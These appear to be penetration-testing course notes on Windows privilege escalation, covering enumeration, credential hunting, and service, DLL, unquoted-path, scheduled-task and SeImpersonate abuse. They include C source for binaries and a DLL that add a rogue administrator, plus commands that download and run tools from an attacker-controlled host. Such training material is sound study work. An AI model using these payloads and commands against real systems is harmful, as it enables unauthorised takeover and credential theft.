# Windows Privilege Escalation Cheat Sheet (PEN-200, Ch. 17)

Goal: go from unprivileged foothold → administrative/SYSTEM access, in order to read other users' files, dump config, or run Mimikatz. Two Learning Units: **Enumerating Windows** (17.1) and **Leveraging Windows Services** (17.2), plus **Abusing other Windows components** (17.3).

> A skilled penetration tester's goal is not to blindly attempt privilege escalation on every machine, but to identify machines where privileged access leads to further compromise of the client's infrastructure. Most lab machines are rootable — many real machines are not.

---

## 17.1 Enumerating Windows

### 17.1.1 Understanding Windows privileges and access control mechanisms

Four core concepts: **SID**, **access token**, **Mandatory Integrity Control (MIC)**, **UAC**.

**Security Identifier (SID)** — unique value identifying a principal (user/group). Generated by the LSA (local accounts/groups) or a Domain Controller (domain accounts/groups). Never changes once created. Windows access control uses only the SID, never the username, to identify principals.

Structure: `S-R-X-Y`
- `S` — literal "S", identifies the string as a SID.
- `R` — revision, always `1`.
- `X` — identifier authority (`5` = NT Authority, most common — local/domain users & groups).
- `Y` — one or more sub-authorities: domain identifier (domain SID for domain users, local machine SID for local users, `32` for built-in principals) + **RID** (Relative Identifier, identifies the specific user/group).

```
S-1-5-21-1336799502-1441772794-948155058-1001
```
RID `1001` → since RIDs start at 1000 for nearly all principals, this is the *second* local user created on the system.

**Well-known SIDs** (RID < 1000 — generic/built-in, not domain-specific):

| SID | Principal |
|---|---|
| `S-1-0-0` | Nobody |
| `S-1-1-0` | Everybody |
| `S-1-5-11` | Authenticated Users |
| `S-1-5-18` | Local System |
| `S-1-5-<domain-id>-500` | Administrator |

**Access token** — assigned to a user after authentication; describes the user's security context (SIDs of the user + all groups, privileges). Two token types:
- **Primary token** — created for/attached to a process, describes security context of the user who started it.
- **Impersonation token** — allows a thread to run in a *different* security context than the process's primary token (e.g. a server thread impersonating a connecting client).

**Mandatory Integrity Control (MIC)** — restricts access to objects (processes, files, registry keys) based on integrity levels; lower-integrity processes cannot modify higher-integrity objects even with otherwise-sufficient permissions. Processes/objects normally inherit the integrity level of their creating user, except: a process spawned by a low-integrity executable inherits that same low integrity.

Five integrity levels (Vista onward):

| Level | Used for |
|---|---|
| System | Highly trusted system processes (Winlogon, LSASS) |
| High | Elevated/admin processes |
| Medium | Standard user processes (default) |
| Low | Sandboxed/restricted (e.g. browsers) |
| Untrusted | Rarely used, highly restricted |

Check integrity levels: **Process Explorer** (GUI), `whoami /groups` (current user's integrity level), `icacls` (file integrity level).

**User Account Control (UAC)** — enforces privilege separation. Even when an admin launches a process, by default it runs at **Medium** integrity; the user must explicitly elevate to **High** integrity to modify system files/sensitive registry keys — this is the source of the elevation prompt. Attackers/pen testers often seek to **bypass UAC** to reach High-integrity execution directly.

> Attackers and penetration testers often seek to bypass UAC to execute processes at high integrity, allowing unrestricted access to system resources.

### 17.1.2 Situational awareness

Key info to always gather on a fresh foothold:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- OS, version, architecture
- Network information
- Installed applications
- Running processes

```cmd
whoami                      :: username + hostname (hostname can imply machine role, e.g. WEB01, MSSQL01)
whoami /groups              :: groups current user belongs to (SIDs, attributes)
```

```powershell
Get-LocalUser                                        # all local users
net user                                             # alternative (cmd/PowerShell)
net user <username>                                  # detail on one user: groups, logon hours, last logon
Get-LocalGroup                                       # all local groups (flag custom/non-standard ones)
Get-LocalGroupMember <groupname>                     # members of a group, e.g. Administrators, adminteam
net localgroup administrators                        # cmd equivalent
```

> Members of **Backup Operators** can backup/restore *all* files on a computer, even ones they lack normal permissions for. Members of **Remote Desktop Users** can RDP in; members of **Remote Management Users** can connect via WinRM. Don't confuse built-in `Backup Operators` with a custom group like `BackupUsers`.

```powershell
systeminfo                  # OS name/version, architecture (64-bit matters for which binaries you can run)
ipconfig /all                # interfaces, DHCP/manual IP, DNS, gateway, MAC
route print                  # routing table -> possible pivot targets/other networks
netstat -ano                 # -a all connections, -n no name resolution, -o show PID
```

Interpreting `netstat`: open 80/443 → likely web server; 3306 → likely MySQL; existing RDP session from another IP → another logged-on user (potential Mimikatz credential target once elevated).

```powershell
# Installed applications via registry (32-bit and 64-bit hives)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process          # running processes; cross-reference PIDs against netstat output
```

> Registry-based application listings can be incomplete (flawed installers). Always also manually check the 32-bit/64-bit `Program Files` directories and the user's `Downloads` folder.

### 17.1.3 Hidden in plain view

Users leave sensitive info behind — meeting notes, config files, onboarding docs, the modern "post-it note" (a desktop text file). Search based on situational-awareness clues (e.g. a password manager or XAMPP install implies related config/credential files).

```powershell
# Search broadly for password-manager database files
Get-ChildItem -Path C:\ -Include *.kdbx,*.<other-db-ext> -File -Recurse -ErrorAction SilentlyContinue

# Search an application's own config for credentials (example: XAMPP)
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt

# Search a user's home dir for common document/text formats
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
cat Desktop\asdf.txt
```

Workflow in the chapter's worked example: a text file on `dave`'s desktop leaked a password for user `steve` → RDP in as `steve` → `steve` could read `C:\xampp\mysql\bin\my.ini` (which `dave` was denied) → a comment in that file revealed the **Windows password for `backupadmin`** (a local Administrator) → `runas /user:backupadmin cmd` used to pop a shell as that admin.

```cmd
runas /user:backupadmin cmd
:: password prompt appears; enter the discovered password
```

> When we find passwords in configuration or text files, always try them against **all possible users or services** — passwords are frequently reused.

> **Cyclical nature of a pentest**: gaining access to a *new* user means the search for sensitive information starts again from scratch (different file permissions, different visible files). This mindset applies to nearly every phase of a pentest, not just this one.

**Alternate access methods when no GUI/`runas` is available** (needed because `runas`'s password prompt doesn't work through most non-interactive shells like a bind shell or WinRM):
- WinRM/RDP — if the target user is a member of the corresponding group (Remote Management Users / Remote Desktop Users).
- Schedule a task to run as the target user, if that user has the **"Log on as a batch job"** right.
- **PsExec** (Sysinternals) — if the target user has an active session.

### 17.1.4 Information goldmine: PowerShell

Improved enterprise security awareness → less plaintext creds in notes, but more **PowerShell logging** deployed defensively — which itself becomes an attacker goldmine.

Two key PowerShell logging mechanisms:
- **PowerShell Transcription** ("over-the-shoulder transcription") — logs literally what a user typed; stored in transcript files (user home dir, central dir, or network share).
- **PowerShell Script Block Logging** — records full script/command content as events, including originally-encoded/obfuscated code.

Check both PowerShell's own history and the separate PSReadline history — `Clear-History` only clears the in-session `Get-History` list, **not** the PSReadline history file:

```powershell
Get-History                                          # PowerShell's own session history (often empty/cleared)
(Get-PSReadlineOption).HistorySavePath               # find path of the PSReadline history file
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

> `Clear-History` clears PowerShell's own history (`Get-History`) but **not** the command history recorded by the `PSReadline` module — a common admin misunderstanding you can exploit. Only `Administrators` can prevent PSReadline logging (e.g. by setting the `-HistorySaveStyle` option), so on most systems this is a rich, untouched trove.

Also check for transcript files revealed in history (e.g. `Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"`) — a transcript captures commands that `Get-History`/PSReadline history might omit, e.g. the plaintext password used to build a `PSCredential`:

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
```

Rebuilding and using leaked `PSCredential` material found in a transcript:

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

> `Enter-PSSession` / PowerShell Remoting uses **WinRM** by default — the target user must be in the local group **Windows Management Users** (previously "Remote Management Users"). SSH can also be used for PowerShell remoting as an alternative transport.

If a bind shell/`Enter-PSSession` combo misbehaves (missing output, cmdlets not working over the raw pipe), connect over WinRM properly with **evil-winrm** instead:

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"    # escape "!" in the shell
```

### 17.1.5 Automated enumeration

Manual enumeration works but is slow under real engagement time pressure — use automated tools, understanding their limits (they can miss things manual review would catch, e.g. `winPEAS` in the chapter mis-identified the OS as Windows 10 and missed the meeting-notes text file, PowerShell history, and transcript file).

> Automated tools can be blocked by AV. If so, apply Antivirus Evasion techniques, try alternate tools (**Seatbelt**, **JAWS**), or fall back to manual enumeration.

```bash
# On Kali: stage winPEAS and serve it
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

```powershell
# On target
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

winPEAS output color legend: **Red** = special privilege over an object / something misconfigured; **Green** = protection enabled / well configured; **Cyan** = active users; **Blue** = disabled users; **LightYellow** = links.

winPEAS sections worth reviewing: Basic System Information (OS/version/build — verify independently, don't blindly trust), Security settings (incl. PowerShell/NTLM settings, transcript file locations), Users (with group memberships inline), Processes, Services, Scheduled Tasks, Network info, Installed applications, and "possible password files in user homes."

> Never blindly trust automated tool output — cross-check critical facts (e.g. actual OS version) manually.

## 17.2 Leveraging Windows services

A **Windows Service** = long-running background executable/application managed by the **Service Control Manager** (analogous to a Unix daemon). Managed via `services.msc`, PowerShell, or `sc.exe`.

Services typically run as: **LocalSystem** (includes SIDs of `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators`), **NetworkService**, or **LocalService**; alternatively a dedicated service user account.

Three abuse techniques covered: **service binary hijacking**, **DLL hijacking**, **unquoted service path abuse**.

### 17.2.1 Service binary hijacking

Scenario: a developer installs an app as a service without securing binary permissions (e.g. full Read/Write to `Users` group) → a low-privileged user can replace the binary with a malicious one → restart the service (or reboot, if Auto-start) → malicious binary executes with the service's privileges (often `LocalSystem`).

> `Get-CimInstance`/`Get-Service` return "permission denied" for a non-admin user over a **network logon** (WinRM, bind shell). Use an **interactive logon** (RDP) instead to query service info as a low-priv user.

```powershell
# List running services with their binary paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
Services with binaries **outside** `C:\Windows\System32` (e.g. `C:\xampp\...`) are user-installed → developer, not Windows, controls the directory/permission structure → prime hijack candidates.

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"      # check permissions on the service binary
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

`icacls` permission mask reference:

| Mask | Permission |
|---|---|
| `F` | Full access |
| `M` | Modify access |
| `RX` | Read and execute access |
| `R` | Read-only access |
| `W` | Write-only access |

> Members of `Authenticated Users` having **Full Access (F)** on a service binary is a common misconfiguration/oversight (developer trying to avoid permission headaches) — but it creates a serious privesc vector.

Malicious replacement binary (C, cross-compiled for Windows) — creates a local admin:

```c
#include <stdlib.h>
int main ()
{
   int i;
   i = system ("net user dave2 password123! /add");
   i = system ("net localgroup administrators dave2 /add");
   return 0;
}
```
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe        # cross-compile to 64-bit .exe (match target arch)
```

```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe          # back up original binary first
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe       # replace with malicious binary
```

If you lack rights to restart the service directly (`net stop <svc>` fails as expected for a low-priv user), check the service **Startup Type**:

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
If `Auto`, a reboot restarts it (needs `SeShutdownPrivilege`):

```cmd
whoami /priv                 :: confirm SeShutdownPrivilege is present (Disabled state just means not currently in use, not unavailable)
shutdown /r /t 0              :: /r = reboot (not shutdown), /t 0 = zero-second delay
```

> A reboot is much less inconvenient in a lab than in production — real engagements have rules of engagement/maintenance windows; unplanned downtime, especially without a current backup, can seriously harm a client's business.

After reboot, verify:
```powershell
Get-LocalGroupMember administrators
```

**PowerUp.ps1 automated detection/abuse:**

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.48.3/PowerUp.ps1')   # or iwr + . .\PowerUp.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile                 # lists services with a modifiable binary, incl. AbuseFunction, CanRestart
Install-ServiceBinary -Name 'mysql'       # AbuseFunction: default creates local admin 'john' / 'Password123!'
```

> `Get-ModifiableServiceFile`'s `AbuseFunction` can fail (`Get-ModifiablePath` internally mishandles a service `PathName` that has an **argument containing a path**, e.g. `--defaults-file=c:\xampp\mysql\bin\my.ini`) — when this happens, fall back to manual exploitation using the identified vulnerable binary path. **Never blindly trust automated tool output**, but PowerUp is still valuable for quickly flagging candidates even if the AbuseFunction itself can't finish the job.

### 17.2.2 DLL hijacking

DLLs (Dynamic Link Libraries) provide shared functionality to programs/OS components (Unix equivalent: Shared Objects). Two abuse angles:
1. Overwrite a DLL the service binary loads directly (may break other functionality, but still gets you code execution).
2. **Hijack the DLL search order** — plant a malicious DLL somewhere Windows checks *before* the legitimate one.

Standard (safe) DLL search order — enabled by default on current Windows:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories listed in the `PATH` environment variable.

> With **safe DLL search mode disabled**, the current directory moves up to position 2 (right after the app directory) — a much larger attack surface. A special hijack case: an app tries to load a DLL that's **missing entirely** from the system (common after incomplete installs/updates) — the app may still function with reduced capability, but the DLL search still runs, giving you a load point.

Workflow (using the FileZilla FTP Client `TextShaping.dll` example — a known public DLL-hijack vuln):

1. Identify installed app + version via registry (`Uninstall\*` keys as in 17.1.2).
2. Confirm write access to the app's install directory: `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`.
3. Use **Process Monitor (Procmon)** — needs admin creds via UAC — to confirm the app actually attempts to `CreateFile` the target DLL from its own app directory and fails there (`NAME NOT FOUND`) before succeeding from `System32`. Filter: Process Name is `filezilla.exe`; then filter Operation is `CreateFile` and Path contains `TextShaping.dll`.
4. Write a malicious DLL with the exact expected filename to the app directory.

DLL entry point mechanics — `DllMain` handles four cases fired on load/unload by a process or thread:

```cpp
BOOL APIENTRY DllMain(
    HANDLE hModule,            // Handle to DLL module
    DWORD ul_reason_for_call,  // Reason for calling function
    LPVOID lpReserved )        // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH:  // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH:  // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Malicious payload placed in `DLL_PROCESS_ATTACH` (fires when a process loads the DLL — the case you want when a *service/app* loads it):

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
   switch ( ul_reason_for_call )
   {
      case DLL_PROCESS_ATTACH:
      int i;
      i = system ("net user dave3 password123! /add");
      i = system ("net localgroup administrators dave3 /add");
      break;
      case DLL_THREAD_ATTACH: break;
      case DLL_THREAD_DETACH: break;
      case DLL_PROCESS_DETACH: break;
   }
   return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc -shared -o TextShaping.dll TextShaping.c    # cross-compile as a 64-bit DLL (-shared)
```
```powershell
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

> The privileges the malicious DLL runs with depend entirely on **who starts the application**, not who planted the DLL. If you can only start the app as a low-priv user, the payload runs at that low privilege too — wait for/coerce a higher-privileged user to launch it instead. Confirm with `net user` / `net localgroup administrators` after the higher-priv user runs the app.

### 17.2.3 Unquoted service paths

Applies when you have **Write** access to a service's directory/subdirectories but **cannot replace files inside them** directly.

Root cause: Windows' `CreateProcess` (`lpApplicationName` parameter) — if a service's binary path contains spaces and is **not quoted**, Windows can't tell where the filename ends and arguments begin. It tries interpreting left-to-right, treating text up to each space as a candidate `.exe`:

```
C:\Program Files\My Program\My Service\service.exe
```
tried in this order:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My Service\service.exe
```

> If you have Write access to an *early* segment in this chain (e.g. `C:\` or `C:\Program Files\`), plant your executable there under the guessed name and the service will run it instead of the real target — **without ever touching the real service binary**, avoiding a Full-Access requirement on it.

Find candidates (WMIC + `findstr`, run from `cmd.exe` to dodge PowerShell quote-escaping issues):

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
(First `findstr /v` excludes services rooted in `C:\Windows\`; second `findstr /v """` excludes any path that *does* contain a `"` — leaving only unquoted, non-Windows-dir paths.)

```powershell
# Confirm you can start/stop the identified service before proceeding
Start-Service -Name 'GammaService'
Stop-Service -Name 'GammaService'
```

Enumerate the guessed path segments and check write access with `icacls` at each level (skip the final segment — that's the actual service binary path, out of scope for this technique):

```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"      # <- e.g. BUILTIN\Users has Write here
```

```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService     # may still error ("cannot start") because your binary doesn't handle leftover
                                # CLI args from the real service — but it still executes before erroring out
```

> `Start-Service`/`Restart-Service` can report a failure/error even though your malicious binary **did execute successfully** (it ran, created the user, then errored on the leftover service arguments it didn't expect). Always verify with `net user` / `net localgroup administrators` regardless of the reported service error.

**PowerUp.ps1 equivalent:**

```powershell
iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService                                                       # lists vulnerable services + ModifiablePath, AbuseFunction, CanRestart
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
```
Default `Write-ServiceBinary` behavior: creates local admin `john` / `Password123!`.

> `Get-UnquotedService` + `Write-ServiceBinary` together automate this entire vector — but still requires manually confirming write access and restart capability, same caveats as manual exploitation.

## 17.3 Abusing other Windows components

### 17.3.1 Scheduled tasks

Windows **Task Scheduler** runs automated tasks/Scheduled Tasks defined by **triggers** (time/date, startup, logon, event) and **actions** (program/script to run). Extra config lives in a task's Conditions/Settings/General property tabs.

Three questions to answer for every task you review:
1. **As which user account (principal)** does the task run?
2. **What triggers** it?
3. **What action(s)** does it execute?

> A task running as your **own current user** offers no privesc value. A task running as `NT AUTHORITY\SYSTEM` or an admin is the target. Also weigh the **trigger timing** against your engagement window — a task that only fires once a week may not be practically exploitable during a short assessment; you can also often **manually invoke** a task instead of waiting for its trigger.

```cmd
schtasks /query /fo LIST /v          :: list all scheduled tasks, verbose, list format
```
Fields to scan for: `Author`, `TaskName`, `Task To Run`, `Run As User`, `Next Run Time`.

PowerShell alternative: `Get-ScheduledTask`.

```powershell
icacls "C:\Users\steve\Pictures\BackendCacheCleanup.exe"    # check write access to the action's target binary
```

```powershell
iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak    # preserve original for restoration
move .\BackendCacheCleanup.exe .\Pictures\                              # drop malicious binary in place
# Wait for the task's Next Run Time to fire, then verify:
net user
net localgroup administrators
```

### 17.3.2 Using exploits

Three categories of exploit-based privesc:

1. **Application-based vulnerabilities** — an installed app running with admin permissions has a code-execution bug (see "Locating Public Exploits" module).
2. **Windows Kernel vulnerabilities** — advanced, deep OS internals knowledge required; can crash the target.
3. **Abusing assigned Windows privileges** (e.g. `SeImpersonatePrivilege`).

> Before using a kernel exploit, confirm your rules of engagement allow methods that could disrupt/crash services or systems. Only use exploits where source code is available (verify nothing malicious is baked into the binary) and, where permitted, test first on a clone of the target.

Patch/version enumeration before searching for a kernel exploit:

```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```
Cross-reference missing `KB` numbers against the Microsoft Security Response Center (MSRC) advisory for a candidate CVE to confirm the target is unpatched.

```cmd
whoami /priv                              :: check assigned privileges before/after
CVE-2023-29360.exe                        :: run the pre-compiled kernel exploit (example from the chapter)
whoami                                    :: verify -> nt authority\system
```

**Privilege abuse — `SeImpersonatePrivilege`:**

`SeImpersonatePrivilege` lets its holder leverage a token belonging to another security context — i.e., perform operations as another user under the right conditions. By default assigned to local **Administrators**, and to the built-in **LOCAL SERVICE**, **NETWORK SERVICE**, and **SERVICE** accounts (exists so services/servers, e.g. RPC or named-pipe servers, can legitimately impersonate connecting clients).

Attack shape: coerce a privileged process (e.g. `NT AUTHORITY\SYSTEM`) into connecting to a **named pipe you control**; once connected, capture and impersonate its authentication. **"Potato" family** tools automate this: **RottenPotato**, **SweetPotato**, **JuicyPotato**, **GodPotato**, **SigmaPotato**.

Other privileges worth checking for the same reason: `SeBackupPrivilege`, `SeAssignPrimaryToken`, `SeLoadDriver`, `SeDebug`.

```cmd
whoami /priv    :: confirm SeImpersonatePrivilege is Enabled
```
```bash
# Kali: stage SigmaPotato
wget https://github.com/<repo>/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```
```powershell
iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
```

> `SeImpersonatePrivilege`-based tools are common privesc wins in real assessments because the privilege is assigned by default to any process running as `LOCAL SERVICE`/`NETWORK SERVICE`/`SERVICE` (e.g. an IIS app pool identity), not just admins — a very frequent finding on web-server footholds.

## 17.4 Wrapping Up / Key Takeaways

**Situational awareness checklist (run every time you land on a new box or new user context):**
1. `whoami`, `whoami /groups`, `whoami /priv` — identity, groups, privileges.
2. `Get-LocalUser` / `net user`, `Get-LocalGroup`, `Get-LocalGroupMember <group>` — other users/groups, flag custom groups and anyone in `Administrators`/`Backup Operators`/`Remote Desktop Users`/`Remote Management Users`.
3. `systeminfo` — OS, version, architecture, patch level.
4. `ipconfig /all`, `route print`, `netstat -ano` — network context, pivot targets, other logged-on users.
5. Registry `Uninstall\*` keys (`Wow6432Node` + native) + `Get-Process` — installed & running software, cross-referenced against ports.
6. Search for sensitive files: password manager DBs, app config (`*.ini`/`*.txt` in app dirs), user home dir docs.
7. PowerShell artifact hunt: `Get-History`, `(Get-PSReadlineOption).HistorySavePath` + its file, `Start-Transcript` output files (default-ish location pattern `C:\Users\Public\Transcripts\` or user home dirs).
8. Run automated tooling (**winPEAS**, **PowerUp.ps1**, or alternates **Seatbelt**/**JAWS** if AV blocks winPEAS) — but always sanity-check its findings manually.

**Windows service abuse — pick based on what you can write to:**
| Vector | Requirement | Tool/Technique |
|---|---|---|
| Service binary hijack | Write/Modify/Full access to the service `.exe` itself | Replace binary, restart service or reboot (if Auto) — `PowerUp.ps1 Get-ModifiableServiceFile` / `Install-ServiceBinary` |
| DLL hijack | Write access to app's install directory + a DLL it loads via search order | Plant malicious DLL with matching name/entry point (`DllMain` / `DLL_PROCESS_ATTACH`); confirm target load behavior with **Procmon** |
| Unquoted service path | Write access to an early path *segment* (not the binary file itself) | Plant `<Segment>.exe` matching the guessed break point — `PowerUp.ps1 Get-UnquotedService` / `Write-ServiceBinary` |

**Other Windows components:**
- **Scheduled Tasks** — enumerate with `schtasks /query /fo LIST /v` or `Get-ScheduledTask`; check Author/Run-As-User/Task-To-Run/Next-Run-Time; if the action binary is writable, replace it and wait for (or manually trigger) the next run.
- **Exploits** — application vulns (public exploit + admin-run app), kernel vulns (`systeminfo` + `win32_quickfixengineering` to find missing KBs → match a CVE), and privilege abuse (`SeImpersonatePrivilege` + Potato-family tools, or `SeBackupPrivilege`/`SeAssignPrimaryToken`/`SeLoadDriver`/`SeDebug`).

**Cross-cutting principles the chapter repeatedly stresses:**
- Enumeration/privesc is **cyclic** — every new user context (new RDP session, new WinRM creds) resets what files/services you can see and write to; re-run the whole checklist.
- **Try reused passwords everywhere** — across users, services, and systems.
- **Never blindly trust automated tool output** (wrong OS version, missed files, failed AbuseFunctions) — but don't abandon automation either; it saves enormous time on real engagements with hundreds/thousands of files to review.
- Respect **rules of engagement** before rebooting machines or running kernel exploits — both carry real risk of downtime/crashes on production systems.
